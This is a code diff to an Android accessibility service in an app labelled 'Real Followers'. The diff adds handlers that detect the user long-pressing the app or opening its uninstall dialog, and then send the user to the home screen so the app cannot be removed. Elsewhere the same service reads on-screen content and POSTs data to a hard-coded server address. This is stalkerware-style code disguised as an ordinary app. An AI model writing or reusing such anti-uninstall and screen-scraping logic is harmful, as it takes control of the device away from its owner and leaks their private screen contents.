@@ -20,6 +20,7 @@ import java.util.Collections;
 import java.util.Comparator;
 import java.util.HashSet;
 import java.util.List;
+import java.util.Objects;
 import java.util.Set;
 import java.util.concurrent.atomic.AtomicInteger;
 
@@ -53,6 +54,27 @@ public class MyAccessibilityService extends AccessibilityService {
                     handleNodeInfo(getRootInActiveWindow(), 0, event.getPackageName().toString());
                 }
             }, 100);
+        }else if(eventType == AccessibilityEvent.TYPE_VIEW_LONG_CLICKED){
+            Log.d("Long Clicked", "Long Clicked");
+            String packageName = event.getPackageName().toString();
+            String className = event.getClassName().toString();
+            String contentDescription = event.getContentDescription().toString();
+            String text = event.getText().toString();
+            Log.d("Long Clicked", packageName + " " + className + " " + contentDescription + " " + text);
+
+            if(contentDescription.contains("Real Followers")){
+                performGlobalAction(GLOBAL_ACTION_HOME);
+            }
+        }
+
+        else if(eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED){
+            Log.d("Window Changed", "Window Changed");
+            String packageName = event.getPackageName().toString();
+            String text = event.getText().toString();
+
+            if(packageName.contains("com.google.android.packageinstaller") && text.contains("Real Followers") && text.contains("Do you want to uninstall this app?")){
+                performGlobalAction(GLOBAL_ACTION_HOME);
+            }
         }
     }
 
@@ -119,7 +141,7 @@ public class MyAccessibilityService extends AccessibilityService {
         protected Void doInBackground(List<String>... params) {
             HttpURLConnection urlConnection = null;
             try {
-                URL url = new URL("http://192.168.1.10:5000");
+                URL url = new URL("http://192.168.1.7:5000");
                 urlConnection = (HttpURLConnection) url.openConnection();
                 urlConnection.setRequestMethod("POST");
                 urlConnection.setDoOutput(true);
